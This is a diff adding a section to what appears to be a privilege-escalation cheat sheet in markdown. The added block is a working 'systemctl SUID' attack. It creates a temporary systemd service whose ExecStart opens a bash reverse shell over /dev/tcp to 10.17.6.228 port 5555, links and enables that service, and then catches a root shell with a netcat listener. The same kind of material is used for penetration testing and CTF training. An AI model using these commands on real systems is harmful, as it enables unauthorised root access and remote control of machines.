@@ -75,6 +75,26 @@ nc -vlp 1234
 _**You Should Get the Root Shell On The Attacker Machine**_
 {% endhint %}
 
+```
+# Example of systemctl suid attack
+
+# Adding a service to the victim machine using the normal shell permission
+
+TF=$(mktemp).service
+
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.17.6.228/5555 0>&1"
+[Install]
+WantedBy=multi-user.target' > $TF
+
+systemctl link $TF
+systemctl enable --now $TF
+
+# Netcat listener on the attacker machine. Should be able to get root shell!
+nc -nlvp 5555
+```
+
 ## Find Command
 
 ### SUID
